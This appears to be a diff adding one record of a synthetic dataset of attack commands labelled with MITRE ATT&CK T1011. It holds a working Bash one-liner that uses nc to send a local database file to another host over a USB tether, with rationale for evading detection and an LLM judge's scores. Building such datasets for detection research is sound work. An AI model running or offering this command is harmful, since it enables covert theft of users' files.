@@ -1,0 +1,38 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i usb0 -nn tcp port 54177 -U -w /dev/null >/dev/null 2>&1 & nc -s 172.16.42.1 172.16.42.2 54177 < /home/user/.config/state.db",
+  "explanation": "Exfiltrates over a USB RNDIS/ECM tether (usb0) using a rare TCP port with tcpdump monitoring restricted to that flow, leveraging a physical medium distinct from the primary channel (T1011).",
+  "rationale_steps": [
+    "Use usb0 (USB Ethernet) to shift exfil to a separate physical link.",
+    "Pick port 54177 to avoid common service signatures.",
+    "Background tcpdump on usb0 to observe without retaining pcaps.",
+    "Send the target file with nc bound to usb0's IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-9327732c",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The bash command is well-formed with valid options, correct redirections, and proper backgrounding using nohup and &.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates data over a USB network interface via nc on a specific TCP port (consistent with exfiltration over another network medium), though tcpdump monitoring likely requires elevated privileges and the provided technique description about system script proxy execution does not apply.",
+        "combined_score": 4.5,
+        "confidence": 0.78,
+        "timestamp": "2025-10-01T21:59:34.399139Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
